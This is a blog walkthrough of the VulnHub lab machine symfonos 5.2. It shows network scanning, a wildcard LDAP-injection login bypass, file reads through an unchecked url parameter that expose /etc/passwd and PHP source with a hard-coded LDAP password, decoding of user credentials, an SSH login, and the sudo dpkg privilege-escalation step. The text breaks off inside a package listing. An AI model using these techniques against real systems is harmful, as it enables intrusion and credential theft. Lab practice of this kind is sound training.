<html lang="en">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
        <title>/f0c1s/blog/sec/vulnhub/symfonos-5.2</title>
        <link rel="stylesheet" href="../../../index.css"/>
        <link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
        <script src="../../../highlight/highlight.min.js"></script>
        <script src="../../../setup.js"></script>
        <script>hljs.highlightAll();</script>
    </head>
<body onload="setup()">
<h1>/f0c1s/blog/sec/vulnhub/symfonos-5.2</h1>

<nav>
    <a href="../../../index.html">/blog</a>
    <a href="../../index.html">Security</a>
    <a href="../index.html">VulnHub</a>
    <a href="../../../sec/vulnhub/symfonos-5.2/symfonos-5.2.html">+ symfonos-5.2 - 2022.01.09 Sunday</a>
</nav>

## Description

> Beginner real life based machine designed to teach people the importance of understanding from the interior.
>
> Tested on VMware and Virtualbox
>
> \## Changelog v1.2 - 2020-03-02 v1.0 - 2020-01-07


[VulnHub: https://www.vulnhub.com/entry/symfonos-52,415/](https://www.vulnhub.com/entry/symfonos-52,415/)
[Series: https://www.vulnhub.com/series/symfonos,217/](https://www.vulnhub.com/series/symfonos,217/)

![0.running-boxes](0.running-boxes.png)

I am running all others(3.1, 4) because I wasn't able to finish them earlier this week.

## Scanning

```shell
fping -aAqg 192.168.56.1/24 | tee fping.txt
192.168.56.1
192.168.56.2
192.168.56.70
192.168.56.92
192.168.56.93
192.168.56.94

```

```shell
sudo netdiscover -r 192.168.56.1/24 -i eth1 -PN
[sudo] password for f0c1s:
 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor
 192.168.56.2    08:00:27:67:bf:c2      1      60  PCS Systemtechnik GmbH
 192.168.56.92   08:00:27:d0:e8:29      1      60  PCS Systemtechnik GmbH
 192.168.56.93   08:00:27:45:ca:64      1      60  PCS Systemtechnik GmbH
 192.168.56.94   08:00:27:40:fb:1a      1      60  PCS Systemtechnik GmbH

-- Active scan completed, 5 Hosts found.

```

```shell
sudo arp-scan -I eth1 -l
Interface: eth1, type: EN10MB, MAC: 08:00:27:13:e5:7a, IPv4: 192.168.56.70
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.2    08:00:27:67:bf:c2       PCS Systemtechnik GmbH
192.168.56.93   08:00:27:45:ca:64       PCS Systemtechnik GmbH
192.168.56.94   08:00:27:40:fb:1a       PCS Systemtechnik GmbH
192.168.56.92   08:00:27:d0:e8:29       PCS Systemtechnik GmbH

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.179 seconds (117.49 hosts/sec). 5 responded

```

```shell
nmap 192.168.56.1/24 -sn -n
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 09:46 IST
Nmap scan report for 192.168.56.70
Host is up (0.0016s latency).
Nmap scan report for 192.168.56.92
Host is up (0.0023s latency).
Nmap scan report for 192.168.56.93
Host is up (0.0020s latency).
Nmap scan report for 192.168.56.94
Host is up (0.0017s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.40 seconds

```

Now there is no indication here about which IP belongs to symfonos 5.2


```shell
nmap 192.168.56.{92,93,94} -n -A
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 09:48 IST
Nmap scan report for 192.168.56.92
Host is up (0.00065s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.56.93
Host is up (0.0010s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey:
|   2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f (RSA)
|   256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 (ECDSA)
|_  256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.56.94
Host is up (0.00072s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 12.42 seconds

```

Going by earlier scans, I can tell that 94 is symfonos 5.2, but that's not conclusive.

![1.web-homepages](1.web-homepages.png)

Because I worked on [symfonos 3](../symfonos-3.1/symfonos-3.1.html){.in}
and [symfonos 4](../symfonos-4/symfonos-4.html){.in},
I know that 94 is symfonos 5.2, but still no indication from the box itself.

This is an interesting problem, I guess I gotta hack them all.

```shell
_nu $RHOST
firing sudo nmap 192.168.56.94 -sU -p- -Pn --min-rate=5000 --open --top-ports=500 -n | tee nmap.udp-all-ports.txt
[sudo] password for f0c1s:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 17:49 IST
Nmap scan report for 192.168.56.94
Host is up (0.00076s latency).
All 500 scanned ports on 192.168.56.94 are in ignored states.
Not shown: 494 open|filtered udp ports (no-response), 6 closed udp ports (port-unreach)
MAC Address: 08:00:27:40:FB:1A (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds

```

```shell
_n $RHOST
firing nmap 192.168.56.94 -n | tee nmap.default.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 17:49 IST
Nmap scan report for 192.168.56.94
Host is up (0.00032s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap
636/tcp open  ldapssl

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds

```

```shell
_ntd $RHOST
firing nmap 192.168.56.94 -p- -Pn -A -T4 --min-rate=5000 -sVC -n | tee nmap.tcp-ports.deep.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 17:49 IST
Nmap scan report for 192.168.56.94
Host is up (0.00014s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.73 seconds

```

```shell
sudo nmap $RHOST -p- -Pn -A -T4 --min-rate=5000 -sVC --script=*enum* -n | tee nmap.enum.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 17:50 IST
Nmap scan report for 192.168.56.94
Host is up (0.0011s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh2-enum-algos:
|   kex_algorithms: (10)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       rsa-sha2-512
|       rsa-sha2-256
|       ssh-rsa
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-enum:
|_  /admin.php: Possible admin folder
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
MAC Address: 08:00:27:40:FB:1A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.09 ms 192.168.56.94

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.43 seconds

```


## Attacking web

```shell
nikto -C all -host http://$RHOST | tee nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.94
+ Target Hostname:    192.168.56.94
+ Target Port:        80
+ Start Time:         2022-01-08 09:58:00 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: cf, size: 59b7f675f3d40, mtime: gzip
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-3092: /admin.php: This might be interesting...
+ OSVDB-3268: /static/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26522 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2022-01-08 09:59:23 (GMT5.5) (83 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


```shell
gobuster dir --url http://$RHOST --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,400 -q -f --wildcard -x php,cgi,bak
/home.php             (Status: 302) [Size: 0] [--> admin.php]
/static/              (Status: 200) [Size: 1744]
/admin.php            (Status: 200) [Size: 1650]
/logout.php           (Status: 302) [Size: 0] [--> admin.php]
/portraits.php        (Status: 200) [Size: 165]

```

![2.home-takes-to-admin](2.home-takes-to-admin.png)

![3.portraits-of-le-gods](3.portraits-of-le-gods.png)

```shell
gobuster dir --url http://$RHOST/static -x jpg,png,cgi,py,txt,php,log,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -f
/zeus.jpg             (Status: 200) [Size: 500476]

```

This shows zeus.jpg, which is not on portraits, but it might be on the home page.

```shell
feroxbuster -q -u http://$RHOST/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k -f
403        9l       28w      278c http://192.168.56.94/icons/
200       20l       96w     1744c http://192.168.56.94/static/
403        9l       28w      278c http://192.168.56.94/icons/small/
403        9l       28w      278c http://192.168.56.94/server-status/
WLD        9l       28w      278c Got 403 for http://192.168.56.94/server-status/15dc442e9d7943f39f40984eea3cc474/ (url length: 32)
WLD         -         -         - Wildcard response is static; auto-filtering 278 responses; toggle this behavior by using --dont-filter
WLD        9l       28w      278c Got 403 for http://192.168.56.94/server-status/fe1d9f6eb3634708a4618c0a140ef9045b0db6b334c145baa6e679b64b3b55cf64b99d6d0f8249bc94157024ec71be35/ (url length: 96)
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_56_94_-1641617769.state ...
Scanning: http://192.168.56.94/
Scanning: http://192.168.56.94/icons/
Scanning: http://192.168.56.94/static/
Scanning: http://192.168.56.94/server-status/

```

![4.static](4.static.png)

```shell
wget -q $RHOST/static/zeus{,1,2,3}.jpg

```

```shell
ls -la
total 792
drwxr-xr-x 2 f0c1s f0c1s   4096 Jan  8 10:29 .
drwxr-xr-x 7 f0c1s f0c1s   4096 Jan  8 09:46 ..
-rw-r--r-- 1 f0c1s f0c1s     82 Jan  8 09:46 fping.txt
-rw-r--r-- 1 f0c1s f0c1s   1728 Jan  8 09:59 nikto.txt
-rw-r--r-- 1 f0c1s f0c1s 173173 Jan  7  2020 zeus1.jpg
-rw-r--r-- 1 f0c1s f0c1s  48830 Jan  7  2020 zeus2.jpg
-rw-r--r-- 1 f0c1s f0c1s  64346 Jan  7  2020 zeus3.jpg
-rw-r--r-- 1 f0c1s f0c1s 500476 Oct  5  2017 zeus.jpg

```

```shell
exiftool zeus*
======== zeus1.jpg
ExifTool Version Number         : 12.36
File Name                       : zeus1.jpg
Directory                       : .
File Size                       : 169 KiB
File Modification Date/Time     : 2020:01:07 02:35:25+05:30
File Access Date/Time           : 2022:01:08 10:29:02+05:30
File Inode Change Date/Time     : 2022:01:08 10:29:02+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Quality                         : 60%
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 777
Image Height                    : 871
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 777x871
Megapixels                      : 0.677
======== zeus2.jpg
ExifTool Version Number         : 12.36
File Name                       : zeus2.jpg
Directory                       : .
File Size                       : 48 KiB
File Modification Date/Time     : 2020:01:07 02:35:25+05:30
File Access Date/Time           : 2022:01:08 10:29:02+05:30
File Inode Change Date/Time     : 2022:01:08 10:29:02+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 200
Y Resolution                    : 200
Image Width                     : 500
Image Height                    : 796
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 500x796
Megapixels                      : 0.398
======== zeus3.jpg
ExifTool Version Number         : 12.36
File Name                       : zeus3.jpg
Directory                       : .
File Size                       : 63 KiB
File Modification Date/Time     : 2020:01:07 02:35:25+05:30
File Access Date/Time           : 2022:01:08 10:29:02+05:30
File Inode Change Date/Time     : 2022:01:08 10:29:02+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 750
Image Height                    : 452
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 750x452
Megapixels                      : 0.339
======== zeus.jpg
ExifTool Version Number         : 12.36
File Name                       : zeus.jpg
Directory                       : .
File Size                       : 489 KiB
File Modification Date/Time     : 2017:10:05 02:34:05+05:30
File Access Date/Time           : 2022:01:08 10:29:02+05:30
File Inode Change Date/Time     : 2022:01:08 10:29:02+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1920x1080
Megapixels                      : 2.1
    4 image files read

```

## Fuzz

I tried multiple things, this worked.

```shell
ffuf -u "http://$RHOST/admin.php?username=FUZZ&password=FUZZ" -w /usr/share/wordlists/dirb/stress/alphanum_case_extra.txt -fc 403,404,401,400 -s -fs 1663
#
*


```

Credentials: `*:*`

Yes, that is `username=*` and `password=*`.

## home.php

![5.home-php](5.home-php.png)

![6.LFI](6.LFI.png)

Notice `home.php?url=http://127.0.0.1/portraits.php`

![7.etc-passwd-via-LFI](7.etc-passwd-via-LFI.png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Wait, no user other than root? Interesting and a first.

/etc/hosts

```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.18.0.23	f060c2ead228
```

### /home.php

```php
<?php
session_start();

if(!isset($_SESSION['loggedin'])){
	header("Location: admin.php");
	exit;
}

if (!empty($_GET["url"]))
{
$r = $_GET["url"];
$result = file_get_contents($r);
}

?>
<html>
<head>
<link rel="stylesheet" type="text/css" href="/static/bootstrap.min.css">
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <a class="navbar-brand" href="home.php">symfonos</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarColor02">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item">
        <a class="nav-link" href="home.php">Home</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="home.php?url=http://127.0.0.1/portraits.php">Portraits</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="logout.php">Logout</a>
      </li>
    </ul>
  </div>
</nav><br />
<center>
<?php
if ($result){
echo $result;
} else {
echo "<h3>Under Developement</h3>";
} ?>
</center>
</body>

```

### /admin.php

```php
<?php
session_start();

if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
    header("location: home.php");
    exit;
}

function authLdap($username, $password) {
  $ldap_ch = ldap_connect("ldap://172.18.0.22");

  ldap_set_option($ldap_ch, LDAP_OPT_PROTOCOL_VERSION, 3);

  if (!$ldap_ch) {
    return FALSE;
  }

  $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");

  if (!$bind) {
    return FALSE;
  }

  $filter = "(&(uid=$username)(userPassword=$password))";
  $result = ldap_search($ldap_ch, "dc=symfonos,dc=local", $filter);

  if (!$result) {
    return FALSE;
  }

  $info = ldap_get_entries($ldap_ch, $result);

  if (!($info) || ($info["count"] == 0)) {
    return FALSE;
  }

  return TRUE;

}

if(isset($_GET['username']) && isset($_GET['password'])){

$username = urldecode($_GET['username']);
$password = urldecode($_GET['password']);

$bIsAuth = authLdap($username, $password);

if (! $bIsAuth ) {
	$msg = "Invalid login";
} else {
        $_SESSION["loggedin"] = true;
	header("location: home.php");
	exit;
}
}
?>
<html>
<head>
<link rel="stylesheet" type="text/css" href="/static/bootstrap.min.css">
</head>
<body><br />
<div class="container">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header">Login</div>
                    <div class="card-body">
                        <form action="admin.php" method="GET">
                            <div class="form-group row">
                                <label for="email_address" class="col-md-4 col-form-label text-md-right">Username</label>
                                <div class="col-md-6">
                                    <input type="text" id="username" class="form-control" name="username" required autofocus>
                                </div>
                            </div>

                            <div class="form-group row">
                                <label for="password" class="col-md-4 col-form-label text-md-right">Password</label>
                                <div class="col-md-6">
                                    <input type="password" id="password" class="form-control" name="password" required>
                                </div>
                            </div>

                            <div class="col-md-6 offset-md-4">
                                <button type="submit" class="btn btn-primary">
                                    Login
                                </button>
			   </div>
                    </div>
                    </form>
                </div>
<center><strong><?php echo $msg; ?></strong></center>
</div>
</body>
</html>

```

Interesting things of note:

- ` $ldap_ch = ldap_connect("ldap://172.18.0.22");`
- ` $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");`

[Take a look at doc](https://www.php.net/manual/en/function.ldap-bind.php)

![8.ldap-bind](8.ldap-bind.png)

## LDAP


```shell
ldapsearch -h $RHOST -p 389 -D "cn=admin,dc=symfonos,dc=local" -w qMDdyZh3cT6eeAWD -b "dc=symfonos,dc=local"
# extended LDIF
#
# LDAPv3
# base <dc=symfonos,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# symfonos.local
dn: dc=symfonos,dc=local
objectClass: top
objectClass: dcObject
objectClass: organization
o: symfonos
dc: symfonos

# admin, symfonos.local
dn: cn=admin,dc=symfonos,dc=local
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator
userPassword:: e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=

# zeus, symfonos.local
dn: uid=zeus,dc=symfonos,dc=local
uid: zeus
cn: zeus
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/zeus
uidNumber: 14583102
gidNumber: 14564100
userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==
mail: zeus@symfonos.local
gecos: Zeus User

# search result
search: 2
result: 0 Success

# numResponses: 4
# numEntries: 3

```

## SSH

```shell
## admin password
echo -n "e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=" | base64 -d
{SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm

## zeus password
echo -n "Y2V0a0tmNHdDdUhDOUZFVA==" | base64 -d
cetkKf4wCuHC9FET
```

```shell
ssh zeus@$RHOST
zeus@192.168.56.94's password:
Linux symfonos5 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Feb  5 06:14:43 2020 from 172.16.1.1
zeus@symfonos5:~$ id
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
zeus@symfonos5:~$ whoami
zeus
zeus@symfonos5:~$ hostname
symfonos5
zeus@symfonos5:~$ date
Sat 08 Jan 2022 12:00:50 PM CST


```

### /etc/passwd

```shell
zeus@symfonos5:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
zeus:x:1000:1000:,,,:/home/zeus:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
zeus@symfonos5:~$
```

![9.ssh-as-zeus](9.ssh-as-zeus.png)

## Abuse nopasswd dpkg

![10.search](10.search.png)

[https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/](https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/)

Well, too much to read, little payoff for now.

Lets go gtfobins!

## Root shell

```shell
zeus@symfonos5:~$ sudo -l
Matching Defaults entries for zeus on symfonos5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zeus may run the following commands on symfonos5:
    (root) NOPASSWD: /usr/bin/dpkg

zeus@symfonos5:~$ sudo dpkg -l
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                          Version                     Architecture Description
+++-=============================-===========================-============-========================================
ii  adduser                       3.118                       all          add and remove users and groups
ii  ame                           1.0                         amd64        no description given
ii  apparmor                      2.13.2-10                   amd64        user-space parser utility for AppArmor
ii  apt                           1.8.2                       amd64        commandline package manager
ii  apt-listchanges               3.19                        all          package change history notification tool
ii  apt-transport-https           1.8.2                       all          transitional package for https support
ii  apt-utils                     1.8.2                       amd64        package management related utility progr
ii  aufs-dkms                     4.19+20190211-1             all          DKMS files to build and install aufs
ii  aufs-tools                    1:4.14+20190211-1           amd64        Tools to manage aufs filesystems
ii  base-files                    10.3+deb10u2                amd64        Debian base system miscellaneous files
ii  base-passwd                   3.5.46                      amd64        Debian base system master password and g
ii  bash                          5.0-4                       amd64        GNU Bourne Again SHell
ii  bash-completion               1:2.8-6                     all          programmable completion for the bash she
ii  bind9-host                    1:9.11.5.P4+dfsg-5.1        amd64        DNS lookup utility (deprecated)
ii  binutils                      2.31.1-16                   amd64        GNU assembler, linker and binary utiliti
